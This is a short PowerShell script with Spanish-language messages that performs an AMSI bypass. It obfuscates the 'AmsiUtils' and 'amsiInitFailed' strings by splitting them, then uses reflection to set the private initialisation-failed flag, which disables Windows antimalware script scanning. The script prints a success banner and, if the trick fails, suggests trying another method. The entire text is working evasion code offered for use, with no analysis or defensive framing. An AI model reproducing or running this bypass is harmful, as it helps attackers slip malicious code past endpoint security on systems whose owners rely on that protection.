Write-Host
Write-Host "Forzando inicialización de AMSI para que falle:"

try {
    
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
Start-Sleep 1
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
Start-Sleep 1
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
Start-Sleep 1
$field.SetValue($null,$true)
Start-Sleep 1
Write-Host
Write-Host "---> AMSI bypass Conseguido!"-ForegroundColor Green -BackgroundColor DarkBlue
Write-Host
pause
Clear-Host
}
catch {
        Write-Host
        Write-Host "---> No ha funcionado, intente otro método" -ForegroundColor Red -BackgroundColor Yellow
        pause
        Clear-Host
}
break;

   
